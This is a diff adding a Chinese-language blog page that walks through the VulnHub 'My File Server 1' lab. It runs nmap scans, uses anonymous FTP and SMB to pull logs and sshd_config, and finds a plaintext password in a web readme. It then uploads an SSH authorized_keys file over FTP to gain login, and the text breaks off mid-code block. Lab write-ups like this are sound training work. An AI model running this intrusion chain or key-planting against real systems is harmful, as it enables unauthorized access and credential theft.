@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="John Doe">
+    
+    
+    
+    
+    
+    
+    <title>MyFileServer | Hexo</title>
+    <!-- inject:style -->
+    <link href="/css/style.css" rel="stylesheet" type="text/css">
+    <!-- endinject -->
+    <style>
+        .cube-loading {
+            top: 0;
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            background: url('/images/lg/loading.gif') no-repeat center center;
+            background-color: rgba(0,0,0,.7);
+        }
+
+        .cube-loading.out {
+            display: none;
+        }
+
+        .cube-loading:before {
+            display: block;
+            content: 'Loading';
+            position: relative;
+            width: 100%;
+            top: 50%;
+            right: -50%;
+            color: #fff;
+        }
+
+        @media(max-width: 768px) {
+            .cube-loading:before {
+                font-size: 1.2em;
+                transform: translate(-24px,20px);
+                -webkit-transform: translate(-24px,20px);
+                -o-transform: translate(-24px,20px);
+                -ms-transform: translate(-24px,20px);
+            }
+        }
+
+        @media(min-width: 768px) {
+            .cube-loading:before {
+
+            }
+        }
+    </style>
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+<div class="cube-body">
+    <nav id="cube-top-memu" class="cube-menu">
+    <ul class="cube-menu-collapse">
+        
+        <li>
+            <i class="cube-icon cube-icon-home" aria-hidden="true"></i>
+            <a href="/">首页</a>
+        </li>
+        
+        <li>
+            <i class="cube-icon cube-icon-archive" aria-hidden="true"></i>
+            <a href="/archives">归档</a>
+        </li>
+        
+        <li>
+            <i class="cube-icon cube-icon-categories" aria-hidden="true"></i>
+            <a href="/categories">分类</a>
+        </li>
+        
+        <li>
+            <i class="cube-icon cube-icon-tags" aria-hidden="true"></i>
+            <a href="/tags">标签</a>
+        </li>
+        
+        <li>
+            <i class="cube-icon cube-icon-about" aria-hidden="true"></i>
+            <a href="/about-me">关于我</a>
+        </li>
+        
+    </ul>
+</nav>
+<nav class="cube-side-menu" id="cube-side-menu">
+    <ul class="cube-menu-list">
+        
+        <li>
+            <a class="lrc-control">Open Lyrics</a>
+        </li>
+        
+        <li>
+            <a class="scroll-to-top">Top</a>
+        </li>
+    </ul>
+</nav>
+    <header class="cube-header" id="cube-header">
+    <img src=" https://api.r10086.com/%E5%9B%BE%E5%8C%85webp/%E6%B5%B7%E8%B4%BC%E7%8E%8B%E6%A8%AA%E5%B1%8F%E7%B3%BB%E5%88%971/wallhaven-0q6vml.webp " alt="头部背景图片">
+    
+    <div class="cube-type">
+        <span class="cube-typed-title">zyzhuv的私人博客</span>
+        <span class="cube-typed-cursor">|</span>
+    </div>
+    
+</header>
+
+    <style>
+        nav.cube-menu:before {
+            content: '';
+            visibility: hidden;
+            position: absolute;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 44px;
+        
+            filter: blur(1px);
+            -webkit-filter: blur(1px);
+        
+            z-index: -1;
+            background-image: url('https://api.r10086.com/%E5%9B%BE%E5%8C%85webp/%E6%B5%B7%E8%B4%BC%E7%8E%8B%E6%A8%AA%E5%B1%8F%E7%B3%BB%E5%88%971/wallhaven-0q6vml.webp');
+            background-repeat: no-repeat;
+            background-position: center -256px;
+            background-size: cover;
+            background-color: transparent;
+        }
+
+        header.cube-background.cube-header-background {
+            visibility: hidden;
+            background-image: url('https://api.r10086.com/%E5%9B%BE%E5%8C%85webp/%E6%B5%B7%E8%B4%BC%E7%8E%8B%E6%A8%AA%E5%B1%8F%E7%B3%BB%E5%88%971/wallhaven-0q6vml.webp');
+            background-position: center -300px;
+        }
+    </style>
+    <header class="cube-background cube-header-background">
+        
+        <div class="cube-type">
+            <span class="cube-typed-title">zyzhuv的私人博客</span>
+            <span class="cube-typed-cursor">|</span>
+        </div>
+        
+    </header>
+    <div class="load-header-background"></div>
+    <script>
+        (function (window) {
+
+            window.headerModule = {}
+            window.headerModule.image = {
+                width: '2000',
+                height: '1314'
+            }
+
+        })(window)
+    </script>
+    
+    <div class="cube-content">
+        <div class="cube-left">
+            <div class="cube-article">
+    <h1 class="title">MyFileServer</h1>
+        
+            <div class="cube-article-header">
+                <div class="cube-article-date">
+                    <i class="cube-icon cube-icon-date" aria-hidden="true"></i>
+                    <!-- moment.js对象 -->
+                    2024-08-01
+                </div>
+                <div class="cube-article-tags">
+    <i class="cube-icon cube-icon-tag" aria-hidden="true"></i>
+    
+</div>
+            </div>
+            
+                    <div class="cube-article-content cube-markdown">
+                        
+                            <h1 id="1下载"><a href="#1下载" class="headerlink" title="1下载"></a>1下载</h1><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/my-file-server-1,432/">https://www.vulnhub.com/entry/my-file-server-1,432/</a></p>
+<span id="more"></span>
+
+<p>ssh-keygen  解释</p>
+<p>nmap的参数  在搞搞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.49.0/24  看到143ip</span><br><span class="line"></span><br><span class="line">nmap -sT --min-rate 10000 -p- 192.168.49.143  看端口</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-01 05:40 EDT</span><br><span class="line">Nmap scan report for 192.168.49.143</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line">Not shown: 64504 filtered tcp ports (no-response), 19 filtered tcp ports (host-unreach), 1004 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">2049/tcp  open  nfs</span><br><span class="line">2121/tcp  open  ccproxy-ftp</span><br><span class="line">20048/tcp open  mountd</span><br><span class="line">MAC Address: 00:0C:29:F2:87:8B (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --min-rate 10000 --top-ports 20 192.168.49.143</span><br><span class="line">utp扫前二十的端口</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">53/udp    open|filtered domain</span><br><span class="line">67/udp    open|filtered dhcps</span><br><span class="line">68/udp    filtered      dhcpc</span><br><span class="line">69/udp    open|filtered tftp</span><br><span class="line">123/udp   open|filtered ntp</span><br><span class="line">135/udp   open|filtered msrpc</span><br><span class="line">137/udp   open|filtered netbios-ns</span><br><span class="line">138/udp   filtered      netbios-dgm</span><br><span class="line">139/udp   open|filtered netbios-ssn</span><br><span class="line">161/udp   filtered      snmp</span><br><span class="line">162/udp   open|filtered snmptrap</span><br><span class="line">445/udp   open|filtered microsoft-ds</span><br><span class="line">500/udp   open|filtered isakmp</span><br><span class="line">514/udp   filtered      syslog</span><br><span class="line">520/udp   open|filtered route</span><br><span class="line">631/udp   open|filtered ipp</span><br><span class="line">1434/udp  open|filtered ms-sql-m</span><br><span class="line">1900/udp  open|filtered upnp</span><br><span class="line">4500/udp  open|filtered nat-t-ike</span><br><span class="line">49152/udp filtered      unknown</span><br><span class="line">MAC Address: 00:0C:29:F2:87:8B (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -sC -p21,22,80,111,445,2049,2121,20048 192.168.49.143</span><br><span class="line">看简单漏洞</span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-01 05:51 EDT</span><br><span class="line">Nmap scan report for 192.168.49.143</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">21/tcp    open  ftp     vsftpd 3.0.2</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    3 0        0              16 Feb 19  2020 pub [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.49.129</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.2 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 75:fa:37:d1:62:4a:15:87:7e:21:83:b9:2f:ff:04:93 (RSA)</span><br><span class="line">|   256 b8:db:2c:ca:e2:70:c3:eb:9a:a8:cc:0e:a2:1c:68:6b (ECDSA)</span><br><span class="line">|_  256 66:a3:1b:55:ca:c2:51:84:41:21:7f:77:40:45:d4:9f (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.6 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS)</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: My File Server</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100003  3,4         2049/udp   nfs</span><br><span class="line">|   100003  3,4         2049/udp6  nfs</span><br><span class="line">|   100005  1,2,3      20048/tcp   mountd</span><br><span class="line">|   100005  1,2,3      20048/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      20048/udp   mountd</span><br><span class="line">|   100005  1,2,3      20048/udp6  mountd</span><br><span class="line">|   100021  1,3,4      35080/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      42226/udp   nlockmgr</span><br><span class="line">|   100021  1,3,4      51428/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      54705/tcp6  nlockmgr</span><br><span class="line">|   100024  1          32842/udp   status</span><br><span class="line">|   100024  1          34498/udp6  status</span><br><span class="line">|   100024  1          42081/tcp   status</span><br><span class="line">|   100024  1          44762/tcp6  status</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">445/tcp   open  2.4.6   Samba smbd 4.9.1 (workgroup: SAMBA)</span><br><span class="line">2049/tcp  open  nfs_acl 3 (RPC #100227)</span><br><span class="line">2121/tcp  open  ftp     ProFTPD 1.3.5</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_Can&#x27;t get directory listing: ERROR</span><br><span class="line">20048/tcp open  mountd  1-3 (RPC #100005)</span><br><span class="line">MAC Address: 00:0C:29:F2:87:8B (VMware)</span><br><span class="line">Service Info: Host: FILESERVER; OS: Unix</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Anonymous ftp 匿名登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">扫漏洞</span><br><span class="line"> nmap --script=vuln -p21,22,80,111,445,2049,2121,20048  192.168.49.143</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-01 05:54 EDT</span><br><span class="line">Nmap scan report for 192.168.49.143</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /icons/: Potentially interesting folder w/ directory listing</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">2049/tcp  open  nfs</span><br><span class="line">2121/tcp  open  ccproxy-ftp</span><br><span class="line">20048/tcp open  mountd</span><br><span class="line">MAC Address: 00:0C:29:F2:87:8B (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-vuln-regsvc-dos: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Service regsvc in Microsoft Windows systems vulnerable to denial of service</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</span><br><span class="line">|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</span><br><span class="line">|       while working on smb-enum-sessions.</span><br><span class="line">|_          </span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_smb-vuln-ms10-061: false</span><br></pre></td></tr></table></figure>
+
+<p> 21  ftp服务，可以匿名登陆</p>
+<p>22 ssh ，打开的</p>
+<p>80 apache</p>
+<p>111  rpc服务</p>
+<p>445 samba服务</p>
+<p>2049 nfs</p>
+<p>2121 ftp</p>
+<p>20048 mountd可挂载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.49.143 </span><br><span class="line">账号anonymous 密码直接回车即可</span><br><span class="line">ls </span><br><span class="line">cd pub</span><br><span class="line">ls</span><br><span class="line">cd log</span><br><span class="line">ls</span><br><span class="line">cron 计划任务  secure </span><br><span class="line">get cron</span><br><span class="line">发现不行</span><br><span class="line">ftp 192.168.49.143 2121</span><br><span class="line">anonymous </span><br><span class="line">跟那个一样但可以get cron，secure </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>445是一个samba服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 192.168.49.143</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] IP: 192.168.49.143:445      Name: 192.168.49.143            Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        print$                                                  NO ACCESS       Printer Drivers</span><br><span class="line">        smbdata                                                 READ, WRITE     smbdata</span><br><span class="line">        smbuser                                                 NO ACCESS       smbuser</span><br><span class="line">        IPC$                                                    NO ACCESS       IPC Service (Samba 4.9.1)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.49.143/smbdata</span><br><span class="line">直接回车即可</span><br><span class="line"></span><br><span class="line">  .                                   D        0  Thu Aug  1 06:51:13 2024</span><br><span class="line">  ..                                  D        0  Tue Feb 18 06:47:54 2020</span><br><span class="line">  anaconda                            D        0  Tue Feb 18 06:48:15 2020</span><br><span class="line">  audit                               D        0  Tue Feb 18 06:48:15 2020</span><br><span class="line">  boot.log                            N     6120  Tue Feb 18 06:48:16 2020</span><br><span class="line">  btmp                                N      384  Tue Feb 18 06:48:16 2020</span><br><span class="line">  cron                                N     4813  Tue Feb 18 06:48:16 2020</span><br><span class="line">  dmesg                               N    31389  Tue Feb 18 06:48:16 2020</span><br><span class="line">  dmesg.old                           N    31389  Tue Feb 18 06:48:16 2020</span><br><span class="line">  glusterfs                           D        0  Tue Feb 18 06:48:16 2020</span><br><span class="line">  lastlog                             N   292292  Tue Feb 18 06:48:16 2020</span><br><span class="line">  maillog                             N     1982  Tue Feb 18 06:48:16 2020</span><br><span class="line">  messages                            N   684379  Tue Feb 18 06:48:17 2020</span><br><span class="line">  ppp                                 D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  samba                               D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  secure                              N    11937  Tue Feb 18 06:48:17 2020</span><br><span class="line">  spooler                             N        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  tallylog                            N        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  tuned                               D        0  Tue Feb 18 06:48:17 2020</span><br><span class="line">  wtmp                                N    25728  Tue Feb 18 06:48:17 2020</span><br><span class="line">  xferlog                             N      100  Tue Feb 18 06:48:17 2020</span><br><span class="line">  yum.log                             N    10915  Tue Feb 18 06:48:17 2020</span><br><span class="line">  sshd_config                         N     3906  Wed Feb 19 02:46:38 2020</span><br><span class="line"></span><br><span class="line">                19976192 blocks of size 1024. 18266752 blocks available</span><br><span class="line">                </span><br><span class="line">                多了一个sshd_config</span><br><span class="line">                get sshd_config</span><br></pre></td></tr></table></figure>
+
+<p>​       cat             sshd_config                                                                             </p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> but this is overridden so installations will only check .ssh/authorized_keys</span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">#AuthorizedPrincipalsFile none</span><br><span class="line"></span><br><span class="line">#AuthorizedKeysCommand none</span><br><span class="line">#AuthorizedKeysCommandUser nobody</span><br><span class="line"></span><br><span class="line"># For this to work you will also need host keys in /etc/ssh/ssh_known_hosts</span><br><span class="line">#HostbasedAuthentication no</span><br><span class="line"># Change to yes if you don&#x27;t trust ~/.ssh/known_hosts for</span><br><span class="line"># HostbasedAuthentication</span><br><span class="line">#IgnoreUserKnownHosts no</span><br><span class="line"># Don&#x27;t read the user&#x27;s ~/.rhosts and ~/.shosts files</span><br><span class="line">#IgnoreRhosts yes</span><br><span class="line"></span><br><span class="line"># To disable tunneled clear text passwords, change to no here!</span><br><span class="line">#PasswordAuthentication yes</span><br><span class="line">#PermitEmptyPasswords no</span><br><span class="line">PasswordAuthentication no</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">PasswordAuthentication no</span><br><span class="line">看到不能密码登录ssh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat secure</span><br><span class="line"></span><br><span class="line">ystem bus name :1.18, object path /org/freedesktop/PolicyKit1/AuthenticationAgent, locale en_IN) (disconnected from bus)</span><br><span class="line">Feb 18 17:16:39 localhost useradd[2389]: new group: name=smbuser, GID=1000</span><br><span class="line">Feb 18 17:16:39 localhost useradd[2389]: new user: name=smbuser, UID=1000, GID=1000, home=/home/smbuser, shell=/bin/bash</span><br><span class="line">Feb 18 17:17:09 localhost passwd: pam_unix(passwd:chauthtok): password changed for smbuser</span><br></pre></td></tr></table></figure>
+
+<p>一个 smbuser&#x2F;chauthtok </p>
+<p>ftp登录不行</p>
+<p>看网站</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u url</span><br><span class="line">扫到了readme.txt</span><br><span class="line">dirb url 没扫到</span><br><span class="line">nikto -h url 没扫到</span><br><span class="line"></span><br><span class="line">打开看到</span><br><span class="line">My Password is</span><br><span class="line">rootroot1</span><br><span class="line"></span><br><span class="line">smbuser/rootroot1</span><br><span class="line">等上</span><br><span class="line">pwd</span><br><span class="line">/home/smbuser</span><br><span class="line"></span><br><span class="line">那在这个生成密钥对，直接免密登录</span><br><span class="line"></span><br><span class="line">在靶机</span><br><span class="line">ssh-keygen</span><br><span class="line">第一个输入一个名字</span><br><span class="line">其他的直接回车</span><br><span class="line">出来了一个test test.pub</span><br><span class="line">上面的密钥认证在config   路径  .ssh/authorized_keys</span><br><span class="line">cp test.pub authorized_keys</span><br><span class="line">在登录的ftp</span><br><span class="line"></span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; mkdir .ssh</span><br><span class="line">257 &quot;/home/smbuser/.ssh&quot; created</span><br><span class="line">ftp&gt; cd .ssh</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">ftp&gt; put authorized_keys</span><br><span class="line">local: authorized_keys remote: authorized_keys</span><br><span class="line">ftp: Can&#x27;t open `authorized_keys&#x27;: No such file or directory</span><br><span class="line">ftp&gt; put authorized_keys</span><br><span class="line">local: authorized_keys remote: authorized_keys</span><br><span class="line">229 Entering Extended Passive Mode (|||5957|).</span><br><span class="line">150 Ok to send data.</span><br><span class="line">100% |******************************************************|   563        5.96 MiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">563 bytes sent in 00:00 (653.75 KiB/s)</span><br><span class="line">ftp&gt; exit</span><br><span class="line">221 Goodbye.</span><br><span class="line"></span><br><span class="line">这个put authorized_keys  把本地的authorized_keys获取了</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span 